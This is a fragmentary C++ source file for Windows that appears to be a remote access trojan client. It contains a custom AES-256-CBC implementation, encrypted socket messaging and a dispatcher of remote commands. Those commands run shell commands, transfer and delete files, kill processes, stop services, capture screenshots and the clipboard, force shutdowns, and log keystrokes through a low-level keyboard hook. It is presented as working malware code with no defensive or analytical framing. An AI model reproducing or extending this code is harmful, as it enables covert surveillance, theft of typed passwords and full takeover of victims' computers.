...
std::string Sha256(const std::string& Data)
{
    ...
    BYTE Hash[32] = {};
    if (BCryptOpenAlgorithmProvider(&AlgHandle, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0) return "";
...
static const BYTE Rcon[15] = { 0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36,0x6c,0xd8,0xab,0x4d,0x9a };
...
void AesKeyExpansion(const std::vector<BYTE>& Key, BYTE* RoundKeys)
{
    ...
    for (int Pos = 32; Pos < 240; Pos += 4, i++)
    {
        ...
        if (i % Nk == 0)
        {
            BYTE U = T[0]; T[0] = AesSbox[T[1]] ^ Rcon[i / Nk - 1]; T[1] = AesSbox[T[2]]; T[2] = AesSbox[T[3]]; T[3] = AesSbox[U];
        }
        else if (Nk > 6 && i % Nk == 4)
        {
            T[0] = AesSbox[T[0]]; T[1] = AesSbox[T[1]]; T[2] = AesSbox[T[2]]; T[3] = AesSbox[T[3]];
        }
        int Prev4 = Pos - 32;
...
{
    BYTE R = 0;
    for (int i = 0; i < 8; i++) { if (B & 1) R ^= A; BYTE Hi = (BYTE)(A & 0x80); A <<= 1; if (Hi) A ^= 0x1b; B >>= 1; }
    return R;
}
...
void AesEncryptBlock(const BYTE* Input, BYTE* Output, const BYTE* RoundKeys)
{
    ...
    for (int R = 1; R < 14; R++) { AesSubBytes(State); AesShiftRows(State); AesMixColumns(State); AesAddRoundKey(State, RoundKeys + R * 16); }
    AesSubBytes(State);
    AesShiftRows(State);
...
void AesDecryptBlock(const BYTE* Input, BYTE* Output, const BYTE* RoundKeys)
{
    ...
    for (int R = 13; R > 0; R--) { AesAddRoundKey(State, RoundKeys + R * 16); AesInvMixColumns(State); AesInvShiftRows(State); AesInvSubBytes(State); }
    AesAddRoundKey(State, RoundKeys);
    memcpy(Output, State, 16);
}

std::vector<BYTE> AesEncryptBytes(const std::vector<BYTE>& Plaintext, const std::vector<BYTE>& Key, const std::vector<BYTE>& Iv)
{
    BYTE RoundKeys[240];
    ...
    {
        for (int j = 0; j < 16; j++) PaddedData[Off + j] ^= Chain[j];
        AesEncryptBlock(PaddedData.data() + Off, Ciphertext.data() + Off, RoundKeys);
        memcpy(Chain, Ciphertext.data() + Off, 16);
    }
    return Ciphertext;
}

std::vector<BYTE> AesDecryptBytes(const std::vector<BYTE>& Ciphertext, const std::vector<BYTE>& Key, const std::vector<BYTE>& Iv)
{
    BYTE RoundKeys[240];
    AesKeyExpansion(Key, RoundKeys);
    ...
    for (ULONG Off = 0; Off < InputSize; Off += 16)
    {
        ...
        for (int j = 0; j < 16; j++) Plaintext[Off + j] = Block[j] ^ Chain[j];
        memcpy(Chain, Ciphertext.data() + Off, 16);
    }
...
std::string AesEncrypt(const std::string& Plaintext, const std::vector<BYTE>& Key)
{
...
std::string AesDecrypt(const std::string& HexCipher, const std::vector<BYTE>& Key)
{
    std::vector<BYTE> Combined = HexToBytes(HexCipher);
    if (Combined.size() < AesIvSize + 16) return "";
...
bool SendEncrypted(SOCKET Sock, const std::string& Message, const std::vector<BYTE>& Key)
{
    std::string Encrypted = AesEncrypt(Message, Key);
    int Len = (int)Encrypted.size();
    int NetLen = htonl(Len);
    if (!SendAll(Sock, (char*)&NetLen, 4)) return false;
    if (!SendAll(Sock, Encrypted.c_str(), Len)) return false;
    return true;
}
...
{
    int NetLen = 0;
    if (!RecvAll(Sock, (char*)&NetLen, 4)) return "";
    int Len = ntohl(NetLen);
    if (Len <= 0 || Len > 1024 * 1024 * 100) return "";
    std::string HexData(Len, 0);
    if (!RecvAll(Sock, &HexData[0], Len)) return "";
...
bool RunShellCommand(const std::string& Cmd, std::string& Output)
{
    ...
    if (!CreatePipe(&StdoutRd, &StdoutWr, &Sa, 0)) return false;
...
std::string CmdHandle(SOCKET Sock, const std::vector<BYTE>& Key, const std::string& Args)
{
    std::string Output;
...
{
    HANDLE HFile = CreateFileW(Utf8ToWide(Args).c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
...
{
    return CreateDirectoryW(Utf8ToWide(Args).c_str(), NULL) ? "OK" : "ERR: create dir failed";
}

std::string CmdCp(const std::string& Args)
{
    auto Parts = SplitString(Args, ' ');
    if (Parts.size() < 2) return "ERR: cp <src> <dst>";
    return CopyFileW(Utf8ToWide(Parts[0]).c_str(), Utf8ToWide(Parts[1]).c_str(), FALSE) ? "OK" : "ERR: copy failed";
}

std::string CmdMv(const std::string& Args)
{
    auto Parts = SplitString(Args, ' ');
    if (Parts.size() < 2) return "ERR: mv <src> <dst>";
    return MoveFileW(Utf8ToWide(Parts[0]).c_str(), Utf8ToWide(Parts[1]).c_str()) ? "OK" : "ERR: move failed";
}
...
std::string CmdPs()
{
    ...
    if (Process32FirstW(Snap, &Pe))
    {
        do
        {
            ...
            sprintf_s(Line, "%-10u%-10u%-10u%s", Pe.th32ProcessID, Pe.th32ParentProcessID, Pe.cntThreads, Name.c_str());
...
std::string CmdKill(const std::string& Args)
{
    ...
    if (Pid == 0)
    {
        ...
        CloseHandle(Snap);
        if (!Found) return "ERR: process not found";
    }
    HANDLE HProc = OpenProcess(PROCESS_TERMINATE, FALSE, Pid);
    if (!HProc) return "ERR: cannot open process";
...
std::string CmdSysinfo()
{
    ...
    if (HMod)
    {
        ...
        if (RtlGetVersion) RtlGetVersion((PRTL_OSVERSIONINFOW)&Oi);
    }
...
std::string CmdNetstat()
{
    ...
    for (DWORD i = 0; i < Table->dwNumEntries; i++)
    {
        ...
        sprintf_s(LocalStr, "%s:%u", inet_ntoa(Local), ntohs((u_short)Row.dwLocalPort));
        sprintf_s(RemoteStr, "%s:%u", inet_ntoa(Remote), ntohs((u_short)Row.dwRemotePort));
        ...
        case MIB_TCP_STATE_ESTAB:      StateStr = "ESTAB     "; break;
        ...
        sprintf_s(Line, "TCP    %-22s %-22s %-14s %u\n", LocalStr, RemoteStr, StateStr, Row.dwOwningPid);
        Result += Line;
    }
    return TrimString(Result);
}
...
{
    std::string Result = "Name                          Display Name                 Status\n";
    Result += "--------------------------------------------------------------------------------\n";
    SC_HANDLE Scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!Scm) return "ERR: cannot open SCM (need admin)";

    DWORD Needed = 0, Count = 0, Resume = 0;
    EnumServicesStatusW(Scm, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &Needed, &Count, &Resume);
    std::vector<BYTE> Buf(Needed);
    LPENUM_SERVICE_STATUSW Services = (LPENUM_SERVICE_STATUSW)Buf.data();
    if (!EnumServicesStatusW(Scm, SERVICE_WIN32, SERVICE_STATE_ALL, Services, Needed, &Needed, &Count, &Resume))
    {
    ...
    for (DWORD i = 0; i < Count; i++)
    {
        ...
        const char* StatusStr = Services[i].ServiceStatus.dwCurrentState == SERVICE_RUNNING ? "Running" : "Stopped";
        char Line[256];
        sprintf_s(Line, "%-30s %-30s %s\n", Name.c_str(), Display.c_str(), StatusStr);
        Result += Line;
    }
    CloseServiceHandle(Scm);
    return TrimString(Result);
...
std::string ServiceControl(const std::string& Name, bool Start)
{
    ...
    if (!Svc) { CloseServiceHandle(Scm); return "ERR: service not found"; }
    BOOL Ok = Start ? StartServiceW(Svc, 0, NULL) : ControlService(Svc, SERVICE_CONTROL_STOP, NULL);
    CloseServiceHandle(Svc);
    CloseServiceHandle(Scm);
    return Ok ? "OK" : "ERR: operation failed";
}

std::string CmdSvcStart(const std::string& Args) { return ServiceControl(Args, true); }
std::string CmdSvcStop(const std::string& Args)  { return ServiceControl(Args, false); }
...
std::string CmdWallpaper(const std::string& Args)
{
    ...
    std::wstring WPath = Utf8ToWide(Args);
    BOOL Ok = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)WPath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
...
std::string CmdMsgbox(const std::string& Args)
{
    ...
    std::thread([WMsg]()
    {
        MessageBoxW(NULL, WMsg.c_str(), L"Remote Message", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
    }).detach();
    return "OK";
}
...
std::string CmdLock()
{
    return LockWorkStation() ? "OK" : "ERR: lock failed";
}

std::string CmdGetclip()
{
    if (!OpenClipboard(NULL)) return "ERR: cannot open clipboard";
...
std::string CmdPower(const std::string& Action)
{
    ...
    UINT Flags = 0;
    if (Action == "shutdown") Flags = EWX_SHUTDOWN | EWX_FORCE;
    else if (Action == "reboot") Flags = EWX_REBOOT | EWX_FORCE;
    else if (Action == "logoff") Flags = EWX_LOGOFF | EWX_FORCE;
...
LRESULT CALLBACK LowLevelKeyboardProc(int Code, WPARAM WParam, LPARAM LParam)
{
    if (Code == HC_ACTION)
    {
        ...
        if (WParam == WM_KEYDOWN || WParam == WM_SYSKEYDOWN)
        {
            ...
            if (Vk == VK_RETURN) { G_KeylogData += "\n"; }
            else if (Vk == VK_SPACE) { G_KeylogData += " "; }
            else if (Vk == VK_TAB) { G_KeylogData += "[TAB]"; }
            else if (Vk == VK_BACK) { G_KeylogData += "[BS]"; }
            else if (Vk == VK_ESCAPE) { G_KeylogData += "[ESC]"; }
            else if (Vk == VK_CONTROL || Vk == VK_LCONTROL || Vk == VK_RCONTROL) { G_KeylogData += "[CTRL]"; }
            else if (Vk == VK_MENU || Vk == VK_LMENU || Vk == VK_RMENU) { G_KeylogData += "[ALT]"; }
            else if (Vk >= VK_F1 && Vk <= VK_F12) { sprintf_s(Buf, "[F%d]", Vk - VK_F1 + 1); G_KeylogData += Buf; }
            else
            {
                BYTE KeyState[256] = {};
                WCHAR WChar = 0;
                if (ToUnicode(Vk, Kb->scanCode, KeyState, &WChar, 1, 0) == 1 && WChar >= 32)
                {
...
std::string CmdKeylog(const std::string& Args)
{
    if (Args == "start")
    {
        if (G_KeylogActive) return "ERR: keylog already running";
        G_KeylogActive = true;
        G_KeylogHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandleW(NULL), 0);
        if (!G_KeylogHook)
        {
    ...
    {
        if (!G_KeylogActive) return "ERR: keylog not running";
        G_KeylogActive = false;
        if (G_KeylogHook)
        {
...
std::string DispatchCommand(SOCKET Sock, const std::vector<BYTE>& Key, const std::string& Command)
{
    ...
    if (CmdName == "cmd")          return CmdHandle(Sock, Key, CmdArgs);
    if (CmdName == "ls")           return CmdLs(CmdArgs);
    if (CmdName == "cat")          return CmdCat(CmdArgs);
    if (CmdName == "rm")           return CmdRm(CmdArgs);
    if (CmdName == "mkdir")        return CmdMkdir(CmdArgs);
    if (CmdName == "cp")           return CmdCp(CmdArgs);
    if (CmdName == "mv")           return CmdMv(CmdArgs);
    if (CmdName == "ps")           return CmdPs();
    if (CmdName == "pwd")          return CmdPwd();
    if (CmdName == "kill")         return CmdKill(CmdArgs);
    if (CmdName == "sysinfo")      return CmdSysinfo();
    if (CmdName == "drives")       return CmdDrives();
    if (CmdName == "netstat")      return CmdNetstat();
    if (CmdName == "wifi")         return CmdWifi();
    if (CmdName == "services")     return CmdServices();
    if (CmdName == "svc_start")    return CmdSvcStart(CmdArgs);
    if (CmdName == "svc_stop")     return CmdSvcStop(CmdArgs);
    if (CmdName == "screenshot")   return CmdScreenshot();
    if (CmdName == "wallpaper")    return CmdWallpaper(CmdArgs);
    if (CmdName == "msgbox")       return CmdMsgbox(CmdArgs);
    if (CmdName == "lock")         return CmdLock();
    if (CmdName == "getclip")      return CmdGetclip();
    if (CmdName == "setclip")      return CmdSetclip(CmdArgs);
    if (CmdName == "shutdown")     return CmdPower("shutdown");
    if (CmdName == "reboot")       return CmdPower("reboot");
    if (CmdName == "logoff")       return CmdPower("logoff");
    if (CmdName == "keylog")       return CmdKeylog(CmdArgs);

    if (CmdName == "upload")
    {
        auto Parts = SplitString(CmdArgs, ' ');
        if (Parts.size() < 2) return "ERR: upload <filename> <base64data>";
        std::string FileName = Parts[0];
        std::string B64Data = Parts[1];
        for (size_t i = 2; i < Parts.size(); i++)
            B64Data += " " + Parts[i];
        std::vector<BYTE> FileData = Base64Decode(B64Data);
        HANDLE HFile = CreateFileW(Utf8ToWide(FileName).c_str(), GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (HFile == INVALID_HANDLE_VALUE) return "ERR: cannot create file";
        DWORD Written = 0;
    ...
    if (CmdName == "download")
    {
        HANDLE HFile = CreateFileW(Utf8ToWide(CmdArgs).c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (HFile == INVALID_HANDLE_VALUE) return "ERR: cannot open file";
        DWORD Fs = GetFileSize(HFile, NULL);
